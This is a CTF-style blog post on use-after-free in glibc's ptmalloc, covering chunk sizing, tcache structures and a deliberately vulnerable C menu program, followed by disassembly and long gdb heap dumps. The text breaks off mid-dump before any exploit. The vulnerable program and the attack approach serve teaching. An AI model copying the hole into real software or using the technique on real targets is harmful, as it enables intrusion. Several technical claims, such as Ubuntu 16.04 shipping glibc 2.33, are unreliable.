---
title: "Ptmalloc Exploitation - Use After Free"
categories:
  - ctf
tags:
  - unix
  - pwn
---

This is going to be my explanation on an extremely prevalant security vulnerability known as Use After
Free. These vulnerabilities come from lack of access control, which allows the client or end user to
create and control dangling pointers to arbitrary chunks on the heap.

I will be completing and explaining a few labs that demonstrate use after free, so is the toc
to each of them:

====== Table of Contents ======
* [Part 1](#part-1)
* [Part 2](#part-2)
* [Protostar Heap 2](#protostar-heap-2)

## Part 1

In the challenge part of this article, i will be using ubuntu 16.04 xenial which uses glibc 2.33. This
is an extremely archaic glibc that has practically no protections so it is free reign when playing
with our vulnerable binary. If you are running on a modern system, some challenges may arise
within the exploitation section, as dynamic memory allocation is a landscape that is constantly changing.

What is a dangling pointer?, lets take this little piece of code for example:

```c
int main() {
    int*ptr=(int*)malloc(0x10);
}
```

okay, so it will allocate 16 bytes, and return a pointer to it. Another little cool info about malloc
is that it will always allocate 24 bytes if less than, no matter what number you pass to it. If we
pass malloc(16), it will allocate a chunk of 24, if we pass 25, it will alloc a chunk of 40. The reason
behind this strange phenomenon is that chunks will contain metadata, and will pad out the memory
allocated to a multiple of 8 bytes.

in this case, the script is passing malloc 16 bytes, if we attempt this inside of how2heap's malloc
playground, we will get returned a chunk with 24 bytes of usable memory. Even if we were to pass 0
to malloc, it will still return the minimum chunk size, which on 32 bit systems is 16, and 64 bit systems
24 or 32 byte chunks for the metadata.

If allocated more than the minimum, it will pad that chunk by 16 bytes. Lets see an example of this, if
we were to do this:

```c
int main(){
    void* a = malloc(0);
    void* b = malloc(16);
    void* c = malloc(25);
    void* d = malloc(40);
    void* e = malloc(41);
}
```

how large would each allocation be? remember how the minimum allocation size was 24 bytes on 64 bit
systems?. so the "a" chunk will hold 24 bytes of usable memory. Now lets look at the "b" pointer, it
will allocate 16 bytes, it is still under the minimum allocation size, so it will still allocate 24
bytes, and return a ptr to that chunk.

Now lets try this out, we said the minimum was 24 right? how about we allocate 25 bytes?, this will
return a pointer to a chunk of 40 bytes.

Waaht, why??

because it will pad each chunk, 16 bytes. If we were to allocate anywhere between 25-40 bytes, it will
always return a chunk of 40 bytes. What about our "e" pointer then, does this theory of 16 byte padding
scale upwards?, yup, it will allocate 56 bytes.

Now lets talk dangling pointers, how can we create one?

```c
int main() {
    int*ptr=(int*)malloc(0x10);
    free(ptr);
}
```

okay cool, so the chunk that ptr is pointing to has now been freed, it is gone. But as we can see, that
pointer variable still exists within the lifetime of this function, it has not been destroyed. Now if
we were some bad developer trying to write a bad application, and we used the "ptr" pointer after it
had been freed, we would have caused a Use After Free:

```c
int main() {
    int*ptr=(int*)malloc(0x10);
    free(ptr);
    read(0, ptr, 256);
}
```

as we can see, it will be allowing us to read into an empty chunk. This seems like a simple enough
vulnerability, but it has massive security implications like arbitrary reads and writes on a Global
Offset Table entry, which would allow code execution.

It also allows us to perform strange behaviour within the program itself, like if it has an
authentication system, we would most likely be able to exploit it as long as it allocated the auth
variable on the heap.

A uaf may also be the gateway to several other heap exploitation techiques, in which you can
chain together multiple conditions or vulnerabilities to gain arbitrary read or writes. These
techniques come in the form of "house of" titles, which had been popularized by the one and only
Phantasmal Phantasmagoria, who published the "MALLOC DES-MALEFICARUM" phrack article.

This phrack article contained the following house techniques for ptmalloc:

```
The House of Prime
The House of Mind
The House of Force
The House of Lore
The House of Spirit
The House of Chaos
```

Each of these techniques and several variants have now recently been rendered useless, but that has
not stopped the hoards of people recreating seperate variants or new exploitation techniques. The
landscape of dynamic memory allocator misuse is rapidly growing, there are constantly new mitigations
and techniques being released. Something that has worked last year may not be working now, with each new
glibc release.

Some of these new heap exploitation techniques can be found in how2heap's repository on github, but there
is also one called House of Rust that piqued my interest. It is a bypass for the new, safe unlink macro
in which i will get into on another post since i am practically rambling at this point. BACK TO UAF!

here is the source code for the challege, DO NOT ANALYZE THIS!!
quickly compile this without any compilation flags, and delete the source code, we want to understand
the reverse engineering side of this as well.

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void getFlag() {
        execlp("cat","cat","flag.txt",NULL);
}
void admin_info() {
        puts("I am an admin");
}
typedef struct{
        void (*flag)();
        void (*info)();
} admin_struct, *admin;

typedef struct {
        char name[16];
} student_struct, *student;


int main() {
        int choice;
        student new_student = NULL;
        admin new_admin = NULL;

        while(1){
                puts("MENU");
                puts("1: Make new admin");
                puts("2: Make new user");
                puts("3: Print admin info");
                puts("4: Edit Student Name");
                puts("5: Print Student Name");
                puts("6: Delete admin");
                puts("7: Delete user");
                printf("\nChoice: ");
                fflush(stdout);
                scanf("%d%*c", &choice);
                if(choice == 1) {
                        new_admin = malloc(sizeof(admin_struct));
                        new_admin->info = admin_info;
                        new_admin->flag = getFlag;
                }
                else if(choice == 2) {
                        new_student = malloc(sizeof(student_struct));
                        printf("What is your name: ");
                        fflush(stdout);
                        read(0,new_student->name,16);
                }
                else if(choice == 3)
                        new_admin->info();
                else if(choice == 4){
                        printf("What is your name: ");
                        fflush(stdout);
                        read(0,new_student->name,16);
                }
                else if(choice == 5){
                        if(new_student == NULL){
                                printf("New student has not been created yet\n");
                        }
                        else{
                                printf("Students name is %s\n",new_student->name);
                        }
                }
                else if(choice == 6) {
                        free(new_admin);
                }
                else if(choice == 7)
                        free(new_student);
                else
                        puts("bad input");
        }
        return 0;
}
```

if we run the binary, we get prompted with this menu:

```
MENU
1: Make new admin
2: Make new user
3: Print admin info
4: Edit Student Name
5: Print Student Name
6: Delete admin
7: Delete user

Choice:
```

as we can see, we have the ability to create 2 different users, which means 2 different chunk sizes.
we can create, print, edit, and delete either a student or admin object, besides the editing for an
admin object. If we look through the symbols, we have a get_flag() function which should, obviously
cat out the flag for us. This means that there should either be an option in the admin menu after we
have "authenticated", or we will be overwriting a GOT entry.

This binary will not have an array of objects, which means we CANNOT have more than 1 admin, and 1
student.

The first one seems easier, so lets try that first. There are already a few scenarios that we can think
of, in the exploitation of this binary. Lets first allocate a student:

```
HEAP:
+-------+ <- pointer we control
|student|
+-------+
```

okay, so we now have a student object allocated on the heap, nice. Lets free that chunk and see what
happens.

```
HEAP:
          <- pointer we control
```

there is NOTHING on the heap, only metadata left, and the entry to the tcache bin. Now, i have not
explained the internals of ptmalloc, but i will soon. I will give my best summary of the uses of bins
within the ptmalloc ecosytem.

tcache, also known as Thread Local Caching is an optimization mechanism implemented with the creation
of ptmalloc. The previous version of this memory allocator was called dlmalloc, which is named after
the author of the allocator, Doug Lee. The reason the NEW allocator is called ptmalloc, is due to
its POSIX thread awareness. This means that it can handle threaded applications that also want to
use dynamic memory without causing 3 extra seconds of overhead between each allocation.

This is where the optimization, and caching mechanism that had been implemented in ptmalloc was born.
Tcache, and every other bin implemented within ptmalloc is for optimization's sake. Inherently,
dynamic memory allocation is an extremely slow process. It takes a 2 "system calls" to allocate and
return a chunk of memory.

This, compared to the stack, is DRASTICALLY slower and always will be. So, tcache was born along with
it's plethora of security vulnerabilities. The tcache is a singly linked list of entries, that
hold pointers to freed chunks. The main tcache structure is named "tcache_perthread_struct", and each
tcache entry is named "tcache_entry"

here is the source to both of them:

```c
typedef struct tcache_entry {
  struct tcache_entry *next;
} tcache_entry;

# define TCACHE_MAX_BINS                64
typedef struct tcache_perthread_struct {
  char counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;

static __thread tcache_perthread_struct *tcache = NULL;
```

as we can see, the tcache_entry will be a series of linked lists, which will point to the next entry
or freed chunk. This linked list will allow malloc to iterate through and check for chunks that match
the exact allocation size. There is a maximum of 64 tcache bins per thread, and a maximum of 7 chunks
per tcache linked list of entries.

this may seem extremely confusing, but at the end, it all comes down to:

"small chunk go in tcache, malloc look first in tcache, and if find perfect size then malloc use, ooga"

of course, there is much more that goes into tcache, like that mysterious "counts" char array which
will hold the number of chunks within the tcache_entry chain and allow us to stop using the tcache
at 7 freed chunks per chain.

Lets draw a diagram of sorts:

```
TCACHE:
                           +--+-----------------------+
char counts[64];           |0 |                       |
                           +--+-----------------------+
tcache_entry *entries[64]; |0 |                       |
                           +--+-----------------------+
                           |
                           +-->+---------+
                               |  entry  |
                               +---------+
                                        |
                                        +-->+-------+
                                            | chunk |
                                            +-------+
```

the main tcache entry, in which index 0 will point to the entry, which will point to the chunk through
the fd metadata. Heap metadata is another topic completely that i will not be explaining here either.

I plan to do an extremely in depth ptmalloc explanation in the near future, so look out for that :)

anyways, now that we understand the premise of the tcache, we can begin to visualize how our uaf bug
will work. Obviously, we have the ability to malloc, free, read and write into that allocated object
on the heap.

if we can groom the heap a bit, play with a little feng shui, then we can arrange the heap in a way
that will be nice for us. How do we know the size of the chunks?, how do we change the size if it is
not perfect?

The admin and student structs are the same size, and there is a reason for this without looking at the
source code. Lets view the disassembly of each malloc call for student and admin:

```nasm
student:
  4008a1:       bf 10 00 00 00          mov    edi,0x10
  4008a6:       e8 95 fd ff ff          call   400640 <malloc@plt>
  4008ab:       48 89 45 e8             mov    QWORD PTR [rbp-0x18],rax
  4008af:       bf f9 0a 40 00          mov    edi,0x400af9
  4008b4:       b8 00 00 00 00          mov    eax,0x0
  4008b9:       e8 52 fd ff ff          call   400610 <printf@plt>

admin:
  40086f:       bf 10 00 00 00          mov    edi,0x10
  400874:       e8 c7 fd ff ff          call   400640 <malloc@plt>
  400879:       48 89 45 f0             mov    QWORD PTR [rbp-0x10],rax
```

okay, lets explain these two snippets of disassembly.

first, the student snippet of code, for those who may be familiar with the x86 cdecl calling convention,
this may look strange to you, as you know that the parameter is being passed through edi, rather than
ebx. This is a 64 bit binary, which means that the first parameter is ACTUALLY being passed through the
lower 32 bits of rdi.

why though??, why use a 32 bit register for this??

because it is a 32 bit integer, we are passing a 32 bit signed integer to malloc, so we will be using
a 32 bit register.

Next, we will call malloc, with 0x10/16 bytes to allocate, in which it will return 24 bytes of usable
memory, or 32 bytes + the metadata.

next, we will store it in a local variable which will act as a pointer to that chunk of memory.

then, it will move the string "What is your name:" into the edi/rdi register, then mov 0 into the
eax register. This is either a return value or a null paremter to printf.

it will then print, and ask us for our name which proves that this is our student allocation.

okay, as we can see it will allocate 16 bytes, so sizeof(student) is 16

lets take a look at the admin struct now:

```nasm
admin:
  40086f:       bf 10 00 00 00          mov    edi,0x10
  400874:       e8 c7 fd ff ff          call   400640 <malloc@plt>
  400879:       48 89 45 f0             mov    QWORD PTR [rbp-0x10],rax
```

again, it will move 16 into a 32 bit signed register, and call malloc. then store it into a different
local variable as a pointer! Okay, so they are both the same size, we know this from the disassembly,
but why are they the same size, lets cheat a little bit to understand this a little better

here is the source code to both the structs:

```c
typedef struct {
    void(*flag)();
    void(*info)();
}admin_struct,*admin;

typedef struct{
    char name[16];
} student_struct,*student;
```

okay, as we can see, the size of the student struct will be 16 bytes large due to sizeof(char) equaling
to 1 byte. So we understand why the user malloc allocated 16 bytes, but what about that weird looking
pointer to a function in admin struct?

that structure holds 2 pointers to 2 different function variables. in psuedo assembler code, the
application of this struct would look something like:

```nasm
mov rax, [flag]
call rax
```

it will dereference that address provided, and execute it. if we were to initialize this struct with:

admin_struct* new_admin = (admin_struct*)malloc(sizeof(admin_struct));

and change the members of the struct accordingly

```c
new_admin->flag = getFlag();
new_admin->info = admin_info();
```

if we were to say call:

new_admin->flag, it would print out the flag, same for the info pointer.

this seems pretty confusing and redundant, but an understanding in low level memory can drastically
improve your skills in exploitation.

okay, so both structs are the same size, we now that we can play with the same chunk between both
admin and student objects, cool. what now, how do we exploit this binary?

### Exploitation
this part of the article involves a lot of debugging and reversing, so i am going to try my best
to explain it with the debugger output. It may be a little messy though, just a heads up on that, gdb
is a prerequisite to any binary exploitation challenge

okay cool, lets now attempt to prove our hypothesis that each of those entries within the admin
object were function pointers. Open up the binary in gdb, and allocate an admin object and a student
object.

```nasm
gef➤  start
[+] Breaking at '{<text variable, no debug info>} 0x11e7 <main>'
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00005555555551e7  →  <main+0> push rbp
$rbx   : 0x0000555555555410  →  <__libc_csu_init+0> endbr64
$rcx   : 0x00007ffff7f85598  →  0x00007ffff7f87960  →  0x0000000000000000
$rdx   : 0x00007fffffffdd98  →  0x00007fffffffe164  →  "SHELL=/usr/bin/zsh"
$rsp   : 0x00007fffffffdc90  →  0x0000000000000000
$rbp   : 0x00007fffffffdc90  →  0x0000000000000000
$rsi   : 0x00007fffffffdd88  →  0x00007fffffffe143  →  "/root/research/pwn/heap/uaf/main"
$rdi   : 0x1
$rip   : 0x00005555555551eb  →  <main+4> sub rsp, 0x20
$r8    : 0x0
$r9    : 0x00007ffff7fdc070  →  <_dl_fini+0> endbr64
$r10   : 0x69682ac
$r11   : 0x202
$r12   : 0x00005555555550b0  →  <_start+0> endbr64
$r13   : 0x0
$r14   : 0x0
$r15   : 0x0
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
─────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdc90│+0x0000: 0x0000000000000000   ← $rsp, $rbp
0x00007fffffffdc98│+0x0008: 0x00007ffff7debb25  →  <__libc_start_main+213> mov edi, eax
0x00007fffffffdca0│+0x0010: 0x00007fffffffdd88  →  0x00007fffffffe143  →  "/root/research/pwn/heap/uaf/main"
0x00007fffffffdca8│+0x0018: 0x00000001f7fca000
0x00007fffffffdcb0│+0x0020: 0x00005555555551e7  →  <main+0> push rbp
0x00007fffffffdcb8│+0x0028: 0x00007fffffffe129  →  0xdd68d2ea3ddbdaa8
0x00007fffffffdcc0│+0x0030: 0x0000555555555410  →  <__libc_csu_init+0> endbr64
0x00007fffffffdcc8│+0x0038: 0xa527f1944da37cc1
───────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x5555555551e2 <admin_info+14>  (bad)
   0x5555555551e3 <admin_info+15>  call   QWORD PTR [rax+0x4855c35d]
   0x5555555551e9 <main+2>         mov    ebp, esp
 → 0x5555555551eb <main+4>         sub    rsp, 0x20
   0x5555555551ef <main+8>         mov    rax, QWORD PTR fs:0x28
   0x5555555551f8 <main+17>        mov    QWORD PTR [rbp-0x8], rax
   0x5555555551fc <main+21>        xor    eax, eax
   0x5555555551fe <main+23>        mov    QWORD PTR [rbp-0x18], 0x0
   0x555555555206 <main+31>        mov    QWORD PTR [rbp-0x10], 0x0
───────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "main", stopped 0x5555555551eb in main (), reason: BREAKPOINT
─────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x5555555551eb → main()
──────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  c
Continuing.
MENU
1: Make new admin
2: Make new user
3: Print admin info
4: Edit Student Name
5: Print Student Name
6: Delete admin
7: Delete user

Choice: 1
MENU
1: Make new admin
2: Make new user
3: Print admin info
4: Edit Student Name
5: Print Student Name
6: Delete admin
7: Delete user

Choice: 2
What is your name: AAAAAAAAAAAAAAAAA
MENU
1: Make new admin
2: Make new user
3: Print admin info
4: Edit Student Name
5: Print Student Name
6: Delete admin
7: Delete user
```

okay, we have allocated 1 user and admin object, lets SIGINT our program for now and check out the
data being written onto the heap.

```nasm
Choice: What is your name: ^C
Program received signal SIGINT, Interrupt.
0x00007ffff7eb4052 in read () from /usr/lib/libc.so.6
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0xfffffffffffffe00
$rbx   : 0x0000555555555410  →  <__libc_csu_init+0> endbr64
$rcx   : 0x00007ffff7eb4052  →  0x5677fffff0003d48 ("H="?)
$rdx   : 0x10
$rsp   : 0x00007fffffffdc68  →  0x000055555555532a  →  <main+323> jmp 0x55555555520e <main+39>
$rbp   : 0x00007fffffffdc90  →  0x0000000000000000
$rsi   : 0x0000555555559b00  →  0x0000000000000000
$rdi   : 0x0
$rip   : 0x00007ffff7eb4052  →  0x5677fffff0003d48 ("H="?)
$r8    : 0x0
$r9    : 0x00007ffff7f85a60  →  0x0000555555559b10  →  0x0000000000000000
$r10   : 0x00005555555560b9  →  "What is your name: "
$r11   : 0x246
$r12   : 0x00005555555550b0  →  <_start+0> endbr64
$r13   : 0x0
$r14   : 0x0
$r15   : 0x0
$eflags: [ZERO adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
─────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdc68│+0x0000: 0x000055555555532a  →  <main+323> jmp 0x55555555520e <main+39>       ← $rsp
0x00007fffffffdc70│+0x0008: 0x0000000200000000
0x00007fffffffdc78│+0x0010: 0x0000555555559b00  →  0x0000000000000000
0x00007fffffffdc80│+0x0018: 0x0000555555559ac0  →  0x00005555555551a9  →  <getFlag+0> push rbp
0x00007fffffffdc88│+0x0020: 0xdd68d2ea3ddbda00
0x00007fffffffdc90│+0x0028: 0x0000000000000000   ← $rbp
0x00007fffffffdc98│+0x0030: 0x00007ffff7debb25  →  <__libc_start_main+213> mov edi, eax
0x00007fffffffdca0│+0x0038: 0x00007fffffffdd88  →  0x00007fffffffe143  →  "/root/research/pwn/heap/uaf/main"
───────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7ffff7eb404c <read+12>        test   eax, eax
   0x7ffff7eb404e <read+14>        jne    0x7ffff7eb4060 <read+32>
   0x7ffff7eb4050 <read+16>        syscall
 → 0x7ffff7eb4052 <read+18>        cmp    rax, 0xfffffffffffff000
   0x7ffff7eb4058 <read+24>        ja     0x7ffff7eb40b0 <read+112>
   0x7ffff7eb405a <read+26>        ret
   0x7ffff7eb405b <read+27>        nop    DWORD PTR [rax+rax*1+0x0]
   0x7ffff7eb4060 <read+32>        sub    rsp, 0x28
   0x7ffff7eb4064 <read+36>        mov    QWORD PTR [rsp+0x18], rdx
───────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "main", stopped 0x7ffff7eb4052 in read (), reason: SIGINT
─────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7ffff7eb4052 → read()
[#1] 0x55555555532a → main()
──────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  info proc mappings
process 17974
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
      0x555555554000     0x555555555000     0x1000        0x0 /root/research/pwn/heap/uaf/main
      0x555555555000     0x555555556000     0x1000     0x1000 /root/research/pwn/heap/uaf/main
      0x555555556000     0x555555557000     0x1000     0x2000 /root/research/pwn/heap/uaf/main
      0x555555557000     0x555555558000     0x1000     0x2000 /root/research/pwn/heap/uaf/main
      0x555555558000     0x555555559000     0x1000     0x3000 /root/research/pwn/heap/uaf/main
      0x555555559000     0x55555557a000    0x21000        0x0 [heap]
      0x7ffff7dc2000     0x7ffff7dc4000     0x2000        0x0
      0x7ffff7dc4000     0x7ffff7dea000    0x26000        0x0 /usr/lib/libc-2.33.so
      0x7ffff7dea000     0x7ffff7f36000   0x14c000    0x26000 /usr/lib/libc-2.33.so
      0x7ffff7f36000     0x7ffff7f82000    0x4c000   0x172000 /usr/lib/libc-2.33.so
      0x7ffff7f82000     0x7ffff7f85000     0x3000   0x1bd000 /usr/lib/libc-2.33.so
      0x7ffff7f85000     0x7ffff7f88000     0x3000   0x1c0000 /usr/lib/libc-2.33.so
      0x7ffff7f88000     0x7ffff7f93000     0xb000        0x0
      0x7ffff7fc6000     0x7ffff7fca000     0x4000        0x0 [vvar]
      0x7ffff7fca000     0x7ffff7fcc000     0x2000        0x0 [vdso]
      0x7ffff7fcc000     0x7ffff7fcd000     0x1000        0x0 /usr/lib/ld-2.33.so
      0x7ffff7fcd000     0x7ffff7ff1000    0x24000     0x1000 /usr/lib/ld-2.33.so
      0x7ffff7ff1000     0x7ffff7ffa000     0x9000    0x25000 /usr/lib/ld-2.33.so
      0x7ffff7ffb000     0x7ffff7ffd000     0x2000    0x2e000 /usr/lib/ld-2.33.so
      0x7ffff7ffd000     0x7ffff7fff000     0x2000    0x30000 /usr/lib/ld-2.33.so
      0x7ffffffde000     0x7ffffffff000    0x21000        0x0 [stack]
  0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]
gef➤  x/50wx 0x555555559000
0x555555559000: 0x00000000      0x00000000      0x00000291      0x00000000
0x555555559010: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559020: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559030: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559040: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559050: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559060: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559070: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559080: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559090: 0x00000000      0x00000000      0x00000000      0x00000000
0x5555555590a0: 0x00000000      0x00000000      0x00000000      0x00000000
0x5555555590b0: 0x00000000      0x00000000      0x00000000      0x00000000
0x5555555590c0: 0x00000000      0x00000000
gef➤
0x5555555590c8: 0x00000000      0x00000000      0x00000000      0x00000000
0x5555555590d8: 0x00000000      0x00000000      0x00000000      0x00000000
0x5555555590e8: 0x00000000      0x00000000      0x00000000      0x00000000
0x5555555590f8: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559108: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559118: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559128: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559138: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559148: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559158: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559168: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559178: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559188: 0x00000000      0x00000000
gef➤
0x555555559190: 0x00000000      0x00000000      0x00000000      0x00000000
0x5555555591a0: 0x00000000      0x00000000      0x00000000      0x00000000
0x5555555591b0: 0x00000000      0x00000000      0x00000000      0x00000000
0x5555555591c0: 0x00000000      0x00000000      0x00000000      0x00000000
0x5555555591d0: 0x00000000      0x00000000      0x00000000      0x00000000
0x5555555591e0: 0x00000000      0x00000000      0x00000000      0x00000000
0x5555555591f0: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559200: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559210: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559220: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559230: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559240: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559250: 0x00000000      0x00000000
gef➤
0x555555559258: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559268: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559278: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559288: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559298: 0x00000411      0x00000000      0x74616857      0x20736920
0x5555555592a8: 0x72756f79      0x6d616e20      0x6d203a65      0x00000a65
0x5555555592b8: 0x00000000      0x00000000      0x00000000      0x00000000
0x5555555592c8: 0x00000000      0x00000000      0x00000000      0x00000000
0x5555555592d8: 0x00000000      0x00000000      0x00000000      0x00000000
0x5555555592e8: 0x00000000      0x00000000      0x00000000      0x00000000
0x5555555592f8: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559308: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559318: 0x00000000      0x00000000
gef➤
0x555555559320: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559330: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559340: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559350: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559360: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559370: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559380: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559390: 0x00000000      0x00000000      0x00000000      0x00000000
0x5555555593a0: 0x00000000      0x00000000      0x00000000      0x00000000
0x5555555593b0: 0x00000000      0x00000000      0x00000000      0x00000000
0x5555555593c0: 0x00000000      0x00000000      0x00000000      0x00000000
0x5555555593d0: 0x00000000      0x00000000      0x00000000      0x00000000
0x5555555593e0: 0x00000000      0x00000000
gef➤
0x5555555593e8: 0x00000000      0x00000000      0x00000000      0x00000000
0x5555555593f8: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559408: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559418: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559428: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559438: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559448: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559458: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559468: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559478: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559488: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559498: 0x00000000      0x00000000      0x00000000      0x00000000
0x5555555594a8: 0x00000000      0x00000000
gef➤
0x5555555594b0: 0x00000000      0x00000000      0x00000000      0x00000000
0x5555555594c0: 0x00000000      0x00000000      0x00000000      0x00000000
0x5555555594d0: 0x00000000      0x00000000      0x00000000      0x00000000
0x5555555594e0: 0x00000000      0x00000000      0x00000000      0x00000000
0x5555555594f0: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559500: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559510: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559520: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559530: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559540: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559550: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559560: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559570: 0x00000000      0x00000000
gef➤
0x555555559578: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559588: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559598: 0x00000000      0x00000000      0x00000000      0x00000000
0x5555555595a8: 0x00000000      0x00000000      0x00000000      0x00000000
0x5555555595b8: 0x00000000      0x00000000      0x00000000      0x00000000
0x5555555595c8: 0x00000000      0x00000000      0x00000000      0x00000000
0x5555555595d8: 0x00000000      0x00000000      0x00000000      0x00000000
0x5555555595e8: 0x00000000      0x00000000      0x00000000      0x00000000
0x5555555595f8: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559608: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559618: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559628: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559638: 0x00000000      0x00000000
gef➤
0x555555559640: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559650: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559660: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559670: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559680: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559690: 0x00000000      0x00000000      0x00000000      0x00000000
0x5555555596a0: 0x00000000      0x00000000      0x00000411      0x00000000
0x5555555596b0: 0x00000a41      0x00000000      0x00000000      0x00000000
0x5555555596c0: 0x00000000      0x00000000      0x00000000      0x00000000
0x5555555596d0: 0x00000000      0x00000000      0x00000000      0x00000000
0x5555555596e0: 0x00000000      0x00000000      0x00000000      0x00000000
0x5555555596f0: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559700: 0x00000000      0x00000000
gef➤
0x555555559708: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559718: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559728: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559738: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559748: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559758: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559768: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559778: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559788: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559798: 0x00000000      0x00000000      0x00000000      0x00000000
0x5555555597a8: 0x00000000      0x00000000      0x00000000      0x00000000
0x5555555597b8: 0x00000000      0x00000000      0x00000000      0x00000000
0x5555555597c8: 0x00000000      0x00000000
gef➤
0x5555555597d0: 0x00000000      0x00000000      0x00000000      0x00000000
0x5555555597e0: 0x00000000      0x00000000      0x00000000      0x00000000
0x5555555597f0: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559800: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559810: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559820: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559830: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559840: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559850: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559860: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559870: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559880: 0x00000000      0x00000000      0x00000000      0x00000000
0x555555559890: 0x00000000      0x00000000
gef➤
0x555555559898: 0x00000000      0x00000000      0x00000000      0x00000000
0x5555555598a8: 0x00000000      0x00000000      0x00000000      0x00000000
